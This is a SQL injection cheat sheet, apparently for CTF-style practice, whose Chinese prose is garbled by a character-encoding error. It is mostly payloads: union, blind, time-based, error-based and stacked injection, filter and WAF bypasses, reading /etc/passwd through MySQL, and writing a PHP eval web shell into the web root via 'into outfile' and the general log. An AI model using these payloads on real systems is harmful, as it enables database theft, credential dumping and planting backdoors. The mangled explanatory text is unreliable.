# SQL



SQL çš„å…¨åæ˜¯ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯æŸ¥è¯¢èµ„æ–™åº“çš„ä¸€ç§ç¨‹åºè¯­è¨€ã€‚

åœ¨è®¸å¤šä¼ä¸šæˆ–å·¥å‚ä¸­ï¼Œå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨èŒ«èŒ«çš„èµ„æ–™ä¸­ï¼Œæ‰¾å‡ºæˆ‘ä»¬æƒ³è¦çš„èµ„è®¯ã€‚å°¤å…¶æ˜¯å½“èµ„æ–™é‡å·²ç»æ”¾å¤§åˆ°è¶…è¿‡å¥½å‡ ç™¾æ—¶ï¼Œæˆ‘ä»¬éƒ½å¸Œæœ›èƒ½æœ‰ä¸€ä¸ªå·¥å…·èƒ½å¿«é€Ÿåœ°æ‰¾åˆ°æœ‰ç”¨çš„è®¯æ¯ï¼Œå®ƒå°±æ˜¯SQLã€‚

## 0x01 MySQL

### 1. å¸¸è§ç±»å‹

#### 1.1 è”åˆæ³¨å…¥

è”åˆæ³¨å…¥å¸¸è§äºé¡µé¢ä¸­å­˜åœ¨å›æ˜¾ä½ç½®ï¼Œèƒ½å¤Ÿç›´æ¥å›æ˜¾è·å–åˆ°æ•°æ®ï¼Œå…³é”®éœ€è¦åˆ©ç”¨UNIONã€‚ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å‰ä¸€ä¸ªè¯­å¥æ‰§è¡Œç»“æœè¦ä¸ºç©ºï¼Œæ‰ä¼šè¿”å›åé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚

-  æ³¨å…¥æ­¥éª¤ 

- -  **åˆ¤æ–­æ³¨å…¥ç‚¹**(æ³¨å…¥ç‚¹ä¸€èˆ¬åˆ†ä¸ºå­—ç¬¦å‹(éœ€è¦' æˆ–å…¶å®ƒå­—ç¬¦è¿›è¡Œé—­åˆçš„)å’Œæ•°å­—å‹(å¯ä»¥ç›´æ¥æ³¨å…¥ä¸éœ€è¦é—­åˆ))
    `?id=1' and 1=1#` æˆ–è€…æ˜¯`?id=1' && 1=1#`(å­—ç¬¦å‹) åˆæˆ–è€…`?id=1 and 1=1#`(æ•°å­—å‹)... 
  -  **åˆ¤æ–­å­—æ®µæ•°é‡**(`select * from ...` ä¸€å…±å­˜åœ¨å‡ ä¸ªå­—æ®µï¼Œå› ä¸º`union select 1,2,3...` è¦å’Œ * ä¸­çš„å­—æ®µä¸ªæ•°åŒ¹é…)
    `?id=1' order by 3#`(3ä¸æŠ¥é”™ï¼Œ4æŠ¥é”™ï¼Œå­—æ®µæ•°ä¸º3) 
  -  **åˆ¤æ–­å›æ˜¾ä½ç½®**(ä½¿å‰é¢çš„è¯­å¥çš„æ‰§è¡Œç»“æœä¸ºç©ºï¼Œå°±æ˜¯è®©æœç´¢ä¸€æ¡ä¸å­˜åœ¨çš„æ•°æ®)
    `?id = -1' union select 1,2,3#`(`union select` ååªè¦å å¤Ÿå­—æ®µæ•°ä¸ªæ•°çš„ä½ç½®å°±è¡Œï¼Œæ•°å­—å¯ä»¥éšæ„ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿï¼Œæ‰€ä»¥å°±åŒºåˆ†å¼€) 
  -  **è·å–æ•°æ®åº“ä¿¡æ¯**
    `?id = -1' union select 1,1,database()`(è¿˜å¯ä»¥è·å–userã€versionç­‰ç­‰) 
  -  **è·å–è¡¨å**(å› ä¸ºå­˜åœ¨å¤šä¸ªè¡¨åçš„æƒ…å†µè€Œé¡µé¢æ‰§è¡Œå›æ˜¾ä¸€æ¡ï¼Œç›¸å½“äºæ‰§è¡Œç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ä½†æ˜¯æ•°ç»„æ²¡æœ‰åŠæ³•èµ‹å€¼ç»™å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆåˆ©ç”¨èšåˆå‡½æ•°å°†æ‰§è¡Œç»“æœæ‹¼æˆä¸€è¡Œã€‚)
    `?id = -1' union select 1,2,group_concat(table_name) from information_schema.tables table_schema=database()#` 
  -  **è·å–åˆ—å**
    `?id = -1' union select 1,2,group_concat(column_name) from information_schema.columns table_name='users'#` 
  -  **è·å–æ•°æ®**
    `?id = -1' union select 1,2,group_concat(password) users#` 

#### 1.2 å¸ƒå°”ç›²æ³¨

å¸¸è§çš„å¸ƒå°”ç›²æ³¨åœºæ™¯æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯è¿”å›å€¼åªæœ‰Trueæˆ–Falseçš„ï¼ŒäºŒæ˜¯Order byç›²æ³¨ã€‚

-  **é€å­—çŒœè§£æ³•** 

- -  **å¸¸è§payloadå½¢å¼**
    `id=0â€™ or ascii(substr((database()),1,1))=112â€”+` 
  -  **æˆªæ–­æ–¹å¼** 

- - -  `**substring/substr(str,startPosition,len)**` 
    -  `**mid(str,startPosition,len)**` 

- -  `**right(str,len)**`
    `right`æ˜¯ä»å­—ç¬¦ä¸²çš„å³è¾¹æˆªå–æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä»…ä»…æ˜¯ç”¨rightåªèƒ½æˆªå–æŒ‡å®šé•¿åº¦ï¼Œä½†æ˜¯å¯ä»¥é…ç½®`ascii`å‡½æ•°ä½¿ç”¨æ¥è·å–æŒ‡å®šä½ç½®çš„`ascii`ç 
  -  `**left(str,len)**`
      	ä»å·¦åˆ°å³æˆªå–å­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯ä¸èƒ½å¤Ÿæˆªå–æŒ‡å®šä½ç½®çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“ asciiå‡½æ•°è½¬åŒ–çš„æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœå•çº¯ä½¿ç”¨leftçš„è¯ï¼Œä¸è®ºæˆªå–å¤šé•¿ç¬¬ä¸€ä¸ªå­—æ¯éƒ½æ˜¯ä¸ä¼šå˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ­é…`reverse`ã€‚
  -  `**regexp**`
      åˆ©ç”¨`regexp`åŒ¹é…å­—ç¬¦ä¸²ï¼Œé€šè¿‡`^`å¯ä»¥æŒ‡å®šèµ·å§‹ä½ç½®ï¼Œ`$æ ‡è®°å¼€å¤´ä½ç½®`ã€‚
  -  `**rlike**`
        ä½¿ç”¨è§„åˆ™å’Œ`regexp`åŒ
  -  `**trim(TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM str))**` 

- - -  ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾ï¼ˆ`BOTH`ï¼‰/å¥é¦–ï¼ˆ`LEADING`ï¼‰/å¥å°¾ï¼ˆ`TRAILING`)çš„å­—ä¸² 

- - - -  ä¸€èˆ¬çš„è§„åˆ™æ˜¯ä¸€ä¸‹è¿™æ ·çš„ï¼Œå­˜åœ¨è¿”å›ç§»é™¤åçš„ç»“æœï¼Œä¸å­˜åœ¨åˆ™è¿”å›æœ¬èº«ã€‚ **æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›¸ç­‰æ¥åˆ¤æ–­æ˜¯å“ªä¸€ä¸ªå­—ç¬¦ã€‚**

- -  `**insert**` 

- - -  `SELECT insert((insert(ç›®æ ‡å­—ç¬¦ä¸²,1,æˆªå–çš„ä½æ•°,'')),2,9999999,'');` 
    -  åˆ†æï¼š`insert`å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ›¿æ¢å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªinsertæŠŠéœ€è¦çš„å­—ç¬¦æ›¿æ¢äº†å‡ºæ¥ï¼Œç¬¬äºŒä¸ª`insert`å°†å­—ç¬¦ä¸²çš„ç¬¬äºŒä¸ªä½ç½®å¼€å§‹æ›¿æ¢ä¸ºç©ºï¼Œä¿è¯æ¯æ¬¡åªæœ‰ä¸€ä¸ªå­—ç¬¦ã€‚

- -  **æ¯”è¾ƒæ–¹å¼** 

- - -  `=ã€>ã€<`
      å¸¸è§çš„æ¯”è¾ƒå¤§å°çš„æ–¹å¼ 
    -  åŠ å‡è¿ç®—
      é€šè¿‡åŠ å‡è¿ç®—å’Œ`and`æˆ–`or`é…åˆå°±èƒ½å¤ŸçŸ¥é“è¿ç®—ç»“æœã€‚
    -  `in`
      åˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦åœ¨å¦å¤–ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œå¤§å°å†™ä¸æ•æ„Ÿ
      åªèƒ½åŒ¹é…ç›¸åŒçš„å­—ç¬¦ä¸²,å¦‚æœä¸ç›¸åŒçš„è¯è¿”å›å°±æ˜¯é”™è¯¯çš„.
    -  `Between...and`
      å½“`=,like, regexp,>,<`è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹è¿™æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œç›¸å½“äºä¸€ä¸ªè¾¹ç•Œçš„ä½œç”¨ã€‚
      å®ƒæ˜¯æ”¯æŒ16è¿›åˆ¶å’Œæ•°å­—çš„ï¼Œå½“å•å¼•å·è¢«è¿‡æ»¤å¯ä»¥åˆ©ç”¨16è¿›åˆ¶æˆ–è€…æ˜¯æ•°å­—ä»£æ›¿ã€‚
    -  `**like**`
      å¯ä»¥æ›¿ä»£=æ¥ä½¿ç”¨äº†
    -  **å¼‚æˆ–(**`**^**`**)**
      é€šå¸¸ä½¿ç”¨åœ¨ä¸èƒ½ä½¿ç”¨æ³¨é‡Šç¬¦çš„æƒ…å†µä¸‹ï¼Œä¸è¿‡å¯¹äºè¿™ç§æƒ…å†µä¹Ÿå¯ä»¥ä½¿ç”¨`-`
    -  `**strcmp**` 

- - - - æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒè¿”å›0ï¼Œä¸ç›¸åŒè¿”å›-1

- - -  `greatest(n1,n2,n3...)` 

- - - - `id=1 and greatest(ascii(substr(database(),0,1)),64)=64`

-  `**Order by**` **ç›²æ³¨** 

- -  `order by asc,(select 1,2,3);--+` 
  -  `**order by true/false**`
      	ä¼šå­˜åœ¨ä¸¤ç§ä¸åŒçš„æ’åºç»“æœï¼Œé‚£ä¹ˆæ ¹æ®è¿™ä¸ªå°±å¯ä»¥åˆ¤æ–­æˆ‘ä»¬æ’å…¥æ‰§è¡Œçš„è¯­å¥æ˜¯`true`è¿˜æ˜¯`false`ï¼Œè¿˜æ˜¯éœ€è¦é€šè¿‡ç¼–å†™è„šæœ¬å»è¿›è¡Œè®°å½•ã€‚ 

- - -  `order by if(1=1,1,sleep(2))`
      ä¹Ÿå¯ä»¥åœ¨`order by`åä½¿ç”¨æ—¶é—´ç›²æ³¨çš„å½¢å¼ã€‚ 

- -  **ä¸UNIONç»“åˆæ¯”è¾ƒ**
    `payload:username = admin' union 1,2,'' order by 2`
    ä¸è¿‡è¿™ä¸ªæ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œå¦‚æœéœ€è¦åˆ¤æ–­å¤§å°å†™éœ€è¦åŠ ä¸Š`binary`



#### 1.3 æ—¶é—´ç›²æ³¨

æ—¶é—´ç›²æ³¨é¡µé¢ä¸­æ˜¯æ²¡æœ‰true/falseçš„ï¼Œåªä¼šè¿”å›ç›¸åŒçš„ç»“æœã€‚

ä¾‹å¦‚:åœ¨ç™»å½•é¡µé¢ä¸­ï¼Œä¸ç®¡æ˜¯ ç”¨æˆ·åè¿˜æ˜¯å¯†ç é”™è¯¯ éƒ½æ˜¯æ˜¾ç¤º ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ã€‚

è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ ¹æ®é¡µé¢çš„è¯·æ±‚æ—¶é—´æ¥åˆ¤æ–­è¯­å¥æ‰§è¡Œçš„ç»“æœã€‚

æ—¶é—´ç›²æ³¨ æˆ‘çš„ç†è§£å°±æ˜¯ ç›¸å½“äº å¸ƒå°”ç›²æ³¨+åˆ¤æ–­ç»“æ„+å»¶æ—¶å‡½æ•°ä¸”ç°åœ¨çš„åˆ¤æ–­ä¾æ®å˜æˆäº†**é¡µé¢æ‰§è¡Œçš„æ—¶é—´é•¿çŸ­.**

å¸¸ç”¨çš„ä¸¤ç§åˆ¤æ–­ç»“æ„ï¼š

-  `IF`
  å¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬å­¦ä¹ ä»£ç ä¸­çš„ä¸‰ç›®è¡¨è¾¾å¼ï¼Œæ¡ä»¶æˆç«‹è¿”å›ç¬¬ä¸€ä¸ªé€—å·åçš„è¡¨è¾¾å¼ã€‚åä¹‹ï¼Œå°±æ˜¯æœ€åä¸€ä¸ªã€‚ 
-  `case`
  å®Œæ•´çš„è¡¨è¾¾å¼æ˜¯:`case when (condition) then xx else xx end`
-  å¦‚æœæ²¡æœ‰`if`å’Œ`case`
  åˆ©ç”¨`sleep(5*(condition))/benchmark(1000000*(1=1),sha1('me7eorite'))`ï¼Œé€šè¿‡æ¡ä»¶è¿”å›çš„ç»“æœæ¥è®¡ç®—å»¶æ—¶çš„æ—¶é—´ï¼Œä¸ä¸€å®šéœ€è¦ç”¨ä¹˜æ³•ã€‚



ä¸€èˆ¬æ¥è¯´æ—¶é—´ç›²æ³¨å­˜åœ¨5ç§å»¶æ—¶å‡½æ•°ï¼š



-  `**sleep(3)**` 

- -  `id=' or if(ascii(substr(database(),1,1))>114,sleep(3),0)%23`

-  `benchmark()` 

- -  `select * from ctf where id ='1' and if(ascii(substr(database(),1,1))=99,benchmark(10000000,sha(1)),0);`

-  **ç¬›å¡å°”ç§¯** 

- -  `select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C`

-  `**get_lock**` 

- - `select get_lock('test',1)`
  - éœ€è¦ä¸¤ä¸ªsessionï¼Œåœ¨ç¬¬ä¸€ä¸ªsessionä¸­åŠ é”ï¼Œç»•ååœ¨ç¬¬äºŒä¸ªçª—å£ä¸­æŸ¥è¯¢..

-  `**rlike+rpad**` 

- -  `rpad(1,3,â€™aâ€™)`æ˜¯æŒ‡ç”¨aå¡«å……ç¬¬ä¸€ä½çš„å­—ç¬¦ä¸²ä»¥è¾¾åˆ°ç¬¬äºŒä½çš„é•¿åº¦,é€šè¿‡å¡«å……ä¸€ä¸ªå¾ˆå¤§çš„æ•°é‡ç„¶åé€šè¿‡`rlike`è¿›è¡ŒåŒ¹é…å®ç°å»¶æ—¶ã€‚



#### 1.4 æŠ¥é”™æ³¨å…¥



-  **æŠ¥é”™ç›²æ³¨** 

- - `exp(1)` 

- - -
    - å¦‚æœæ²¡æœ‰è¿‡æ»¤`if`å’Œ`case`,é‚£æ—¶é—´ç›²æ³¨åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å°†å»¶æ—¶å‡½æ•°æ¢æˆæŠ¥é”™å‡½æ•°
    - å¦‚æœè¿‡æ»¤`if`å’Œ`case`çš„è¯ï¼Œé‚£ä¹ˆåˆ©ç”¨`exp((1=1)+709)` ã€`exp((1=1)*710)` ã€`exp(710-(1=1))...`

- - `cot(0)` 

- - -
    - 0æŠ¥é”™ï¼Œ1ä¸æŠ¥é”™ï¼Œåªè¦æ‡‚äº†è¿™ä¸ªæ„é€ æ–¹å¼ä¹Ÿå¯ä»¥ç†è§£äº†ã€‚

- - `pow(1,2)` 

- - -
    - `pow(2-(1=(xxx)),9999)...` åŠ å‡ä¹˜éƒ½å¯ä»¥ã€‚

-  **æŠ¥é”™å›æ˜¾** 

æŠ¥é”™æ³¨å…¥æ˜¯åˆ©ç”¨mysqlåœ¨å‡ºé”™çš„æ—¶å€™ä¼šå¼•å‡ºæŸ¥è¯¢ä¿¡æ¯çš„ç‰¹å¾

- - `floor` 

- - - `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`

- - `updatexml` 

- - - `select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));`

- - `extractvalue` 

- - - `select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`

- - `exp` 

- - - `select * from test where id=1 and exp(~(select * from(select user())a));`



#### 1.5 å †å æ³¨å…¥



`select`è¢«è¿‡æ»¤ä¸€èˆ¬åªèƒ½ä½¿ç”¨å †å æ³¨å…¥æˆ–è€…æ˜¯åœ¨mysql8çš„æƒ…å†µ



- é¢„ç¼–è¯‘ 

- - `id=1';Set @x=0x31;Prepare a from â€œselect balabala from table1 where 1=?â€;Execute a using @x;`
  - `set @x=0x73656c6563742062616c6162616c612066726f6d207461626c653120776865726520313d31;prepare a from @x;execute a;`

- `**Handler**` 

- - `handler tableName open as xx;` //ä»¥æŸä¸ªè¡¨ä½œä¸ºå¥æŸ„æ‰“å¼€
  - `handler xx read first;` //è¯»å–æ‰€æœ‰å­—æ®µçš„ç¬¬ä¸€æ¡æ•°æ®
  - `handler xx read next;` //è¯»å–æ‰€æœ‰å­—æ®µçš„ä¸‹ä¸€æ¡æ•°æ®
  - `handler xx close;` //å…³é—­å¥æŸ„



#### 1.6 æ–‡ä»¶æ“ä½œ



**å‰æ:**



- ç”¨æˆ·æ˜¯å¦å­˜åœ¨è¯»å†™æƒé™ï¼ŒMysqlæ•°æ®åº“ä¸­çš„userè¡¨ä¸­çš„`file_priv`æ˜¯å¦ä¸ºY
- **secure-file-priv**(`select @@secure_file_priv`) 

- - æ— é™åˆ¶:ä¸å­˜åœ¨å†…å®¹
  - NULL:ç¦æ­¢æ–‡ä»¶è¯»å†™
  - ç›®å½•åï¼šå¯æ“ä½œçš„ç›®å½•



**æ–‡ä»¶è¯»å†™**

- **è¯»æ–‡ä»¶** 

- - `select load_file('file_path');`
  - `load data infile "/etc/passwd" into table åº“é‡Œå­˜åœ¨çš„è¡¨å FIELDS TERMINATED BY 'n';`
  - `load data local infile "/etc/passwd" into table åº“é‡Œå­˜åœ¨çš„è¡¨å FIELDS TERMINATED BY 'n';`

- **å†™æ–‡ä»¶** 

- - `select 1,"<?php eval($_POST['cmd']);?>" into outfile '/var/www/html/1.php';`
  - `select 2,"<?php eval($_POST['cmd']);?>" into dumpfile '/var/www/html/1.php';`



**æ—¥å¿—**

ç”±äºmysqlåœ¨5.5.53ç‰ˆæœ¬ä¹‹åï¼Œ`secure-file-priv`çš„å€¼é»˜è®¤ä¸º`NULL`ï¼Œè¿™ä½¿å¾—æ­£å¸¸è¯»å–æ–‡ä»¶çš„æ“ä½œåŸºæœ¬ä¸å¯è¡Œã€‚æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨mysqlç”Ÿæˆæ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•æ¥ç»•è¿‡ï¼Œä¸è¿‡è¿™ç§æ–¹å¼ä¸€èˆ¬åªæœ‰åœ¨äºPHPMyAdminã€cmsã€å †å æ³¨å…¥ä¸­æ‰å¯ä»¥åˆ©ç”¨ã€‚



```plain
set global general_log_file = '/var/www/html/1.php';`
set global  general_log =  on ;
```



### 2.bypass



#### 2.0 æ³¨å…¥ç‚¹

-  ç›´æ¥æ³¨å…¥`?id=123'#` 
-  å•å¼•å·é€ƒé€¸ 

- -  `?username=admin\&password=|| 1=1#` --> `select * from users where username='admin\' and password='|| 1=1#'` 
  -  å®½å­—èŠ‚æ³¨å…¥(UTF8 -> GBK) 

- - - `id=%df%27or%201=1%23`

-  æ³¨é‡Šç¬¦è¿‡æ»¤ 

- - `?username='1' or extractvalue/*'&password='*/(1,concat(0x7e,(select user()),0x7e)) or '1'`

#### 2.1 ç¼–ç ç»•è¿‡

- 16è¿›åˆ¶ 

- - è¡¨åçš„å•å¼•å·è¿‡æ»¤
  - è¯»æ–‡ä»¶`load_file(0x...)`

- åŒé‡`url`ç¼–ç ç»•waf



#### 2.2 ç®€å•ç»•è¿‡

æœ‰äº›æ—¶å€™ç”±äºä»£ç è¿‡æ»¤çš„ä¸ä¸¥è°¨ï¼Œä¾‹å¦‚ä½¿ç”¨äº†`str_replace`è¿™ç§å‡½æ•°å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ã€‚



-  å¤§å°å†™ç»•è¿‡(å¦‚æœæ²¡æœ‰ä½¿ç”¨`strtolower`) 
-  åŒå†™ç»•è¿‡ 
-  å†…è”æ³¨é‡Š`/*!*/` 

```plain
/*!UnIon12345SelEcT*/ 1,user()
```


æ•°å­—èŒƒå›´1000-50540 

-  æ³¨é‡Š:`(# -> --+ -> ;%00(php<=5.3.4) -> ?id =1' or '1'='1)` 
-  ç­‰äº:(`like -> regexp -> <> -> in`) 
-  `union select` --> `union(select xx);` 
-  é€—å·è¿‡æ»¤ 
   -  `limit 1,1` --> `limit 1 offset 1`
   -  `substr(database(),1,1)` --> `substr(database() from 1 for 1)`
   -  `join` --> `?id = 1 union select * from (select 1)a join (select 2)b join (select 3)c#`
   -  `if` -->`case when ...` or `&& ã€ ||`

-  `limit` 
   -  èšåˆå‡½æ•° `group_concatã€*.concat`
   -  åŠ é™åˆ¶æ¡ä»¶ `having`ã€`where`

-  æµ®ç‚¹æ•° 

```plain
Id= 1E0union select 1,user()
Id=\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\Nfrom admin
```

#### 2.3 å…³é”®å­—ç»•è¿‡

ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨å®é™…çš„æ³¨å…¥ä¸­ä¼šå­˜åœ¨å¾ˆå¤šéƒ½æ˜¯è¿‡æ»¤äº†ç‰¹å®šçš„å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯»æ‰¾ä¸€äº›ç±»ä¼¼åŠŸèƒ½çš„å‡½æ•°

```plain
mysql8: select -->table
mysql5.7.*(å¤§æ¦‚è¿™ä¸ªèŒƒå›´åŸºæœ¬ä¸Šéƒ½å¯ä»¥ç”¨)
ç©ºæ ¼: /**/ -> %a0 -> %0a -> +
```

**ç³»ç»Ÿä¿¡æ¯å‡½æ•°**

| å‡½æ•°                 | è¯´æ˜                                                         |
| -------------------- | ------------------------------------------------------------ |
| `USER()`             | è·å–å½“å‰æ“ä½œå¥æŸ„çš„ç”¨æˆ·åï¼ŒåŒSESSION_USER()ã€CURRENT_USER()ï¼Œæœ‰æ—¶ä¹Ÿç”¨SYSTEM_USER()ã€‚ |
| `DATABASE()`         | è·å–å½“å‰é€‰æ‹©çš„æ•°æ®åº“åï¼ŒåŒSCHEMA()ã€‚                         |
| `VERSION()`          | è·å–å½“å‰ç‰ˆæœ¬ä¿¡æ¯ã€‚                                           |
| `@@secure_file_priv` | è·å–æ–‡ä»¶æ“ä½œæƒé™                                             |
| `@@VERSION`          | è¿”å›ç‰ˆæœ¬ä¿¡æ¯                                                 |

**è¿›åˆ¶è½¬æ¢**

| `ORD(str)`                         | è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIå€¼ã€‚                              |
| ---------------------------------- | ------------------------------------------------------------ |
| `OCT(N)`                           | ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å› `N` çš„å…«è¿›åˆ¶æ•°ï¼Œ`N` æ˜¯ä¸€ä¸ªBIGINT å‹æ•°å€¼ï¼Œä½œç”¨ç›¸å½“äº`CONV(N,10,8)`ã€‚ |
| `HEX(N_S)`                         | å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè¿”å› `N_or_S` çš„16è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ºæ•°å­—æ—¶ï¼Œè¿”å›å…¶16è¿›åˆ¶æ•°å½¢å¼ã€‚ |
| `UNHEX(str)`                       | `HEX(str)` çš„é€†å‘å‡½æ•°ã€‚å°†å‚æ•°ä¸­çš„æ¯ä¸€å¯¹16è¿›åˆ¶æ•°å­—éƒ½è½¬æ¢ä¸º10è¿›åˆ¶æ•°å­—ï¼Œç„¶åå†è½¬æ¢æˆ ASCII ç æ‰€å¯¹åº”çš„å­—ç¬¦ã€‚ |
| `BIN(N)`                           | è¿”å›åè¿›åˆ¶æ•°å€¼ `N` çš„äºŒè¿›åˆ¶æ•°å€¼çš„å­—ç¬¦ä¸²è¡¨ç°å½¢å¼ã€‚            |
| `ASCII(str)`                       | åŒ`ORD(string)`ã€‚                                            |
| `CONV(N,from_base,to_base)`        | å°†æ•°å€¼å‹å‚æ•° `N` ç”±åˆå§‹è¿›åˆ¶ `from_base` è½¬æ¢ä¸ºç›®æ ‡è¿›åˆ¶ `to_base` çš„å½¢å¼å¹¶è¿”å›ã€‚ |
| `CHAR(N,... [USING charset_name])` | å°†æ¯ä¸€ä¸ªå‚æ•° `N` éƒ½è§£é‡Šä¸ºæ•´æ•°ï¼Œè¿”å›ç”±è¿™äº›æ•´æ•°åœ¨ ASCII ç ä¸­æ‰€å¯¹åº”å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ |

**å­—ç¬¦ä¸²æˆªæ–­å‡½æ•°**

| å‡½æ•°                           | è¯´æ˜                                                         |
| ------------------------------ | ------------------------------------------------------------ |
| `SUBSTR(str,N_start,N_length)` | å¯¹æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œä¸ºSUBSTRINGçš„ç®€å•ç‰ˆã€‚                  |
| `SUBSTRING()`                  | å¤šç§æ ¼å¼`SUBSTRING(str,pos)ã€SUBSTRING(str FROM pos)ã€SUBSTRING(str,pos,len)ã€SUBSTRING(str FROM pos FOR len)`ã€‚ |
| `RIGHT(str,len)`               | å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»**æœ€å³è¾¹**æˆªå–æŒ‡å®šé•¿åº¦ã€‚                       |
| `LEFT(str,len)`                | å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»**æœ€å·¦è¾¹**æˆªå–æŒ‡å®šé•¿åº¦ã€‚                       |
| `RPAD(str,len,padstr)`         | åœ¨ `str` å³æ–¹è¡¥é½ `len` ä½çš„å­—ç¬¦ä¸² `padstr`ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ã€‚å¦‚æœ `str` é•¿åº¦å¤§äº `len`ï¼Œåˆ™è¿”å›å€¼çš„é•¿åº¦å°†ç¼©å‡åˆ° `len` æ‰€æŒ‡å®šçš„é•¿åº¦ã€‚ |
| `LPAD(str,len,padstr)`         | ä¸RPADç›¸ä¼¼ï¼Œåœ¨`str`å·¦è¾¹è¡¥é½ã€‚                                |
| `MID(str,pos,len)`             | åŒäº `SUBSTRING(str,pos,len)`ã€‚                              |
| `INSERT(str,pos,len,newstr)`   | åœ¨åŸå§‹å­—ç¬¦ä¸² `str` ä¸­ï¼Œå°†è‡ªå·¦æ•°ç¬¬ `pos` ä½å¼€å§‹ï¼Œé•¿åº¦ä¸º `len` ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ–°å­—ç¬¦ä¸² `newstr`ï¼Œç„¶åè¿”å›ç»è¿‡æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚`INSERT(str,len,1,0x0)`å¯å½“åšæˆªå–å‡½æ•°ã€‚ |
| `CONCAT(str1,str2...)`         | å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²                         |
| `GROUP_CONCAT(...)`            | è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆã€‚         |
| `MAKE_SET(bits,str1,str2,...)` | æ ¹æ®å‚æ•°1ï¼Œè¿”å›æ‰€è¾“å…¥å…¶ä»–çš„å‚æ•°å€¼ã€‚å¯ç”¨ä½œå¸ƒå°”ç›²æ³¨ï¼Œå¦‚ï¼š`EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))`ã€‚ |

#### 2.4 ç©ºæ ¼ç»•è¿‡

-  Mysql 

  -  è¡Œå†…æ³¨é‡Š`/**/` 
  -  æ¢è¡Œç¬¦`%0d%0a` 
  -  åˆ¶è¡¨ç¬¦`%09` 
  -  æ‹¬å·`()` 
    -  `select(id)from(users);`
      åªèƒ½å¯¹ä¸€äº›å­—æ®µï¼Œä¸èƒ½å¯¹å…³é”®å­—ã€‚ 

- `+`ç»•è¿‡ 

  åå¼•å· 

```plain
select`id`from`student`
```


åªèƒ½å¯¹è¡¨åå’Œåˆ—åè¿›è¡Œåå¼•å·ã€‚ 

-  Access 

- - `%09ã€%0aÌµã€ %0cÌµã€%0dÌµã€%16`

-  MSSQL 

- - `[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]`

#### 2.5 `or`è¿‡æ»¤



- `imformation_schema` 
  - `innodb(ä¸€èˆ¬åªèƒ½è·å–è¡¨å)` 

- - `mysql.innodb_table_stats`
    - `innodb_index_stats`v
- - `sys.schema_table_statistics_with_buffer`
  - `sys.schema_auto_increment_columns`
  - `sys.x$schema_flattened_keys`
  - `sys.schema_table_statistics`
  - `sys.schema_tables_with_full_table_scans;`
  - `sys.x$schema_flattened_keys`
- `join`æ³¨å…¥ 
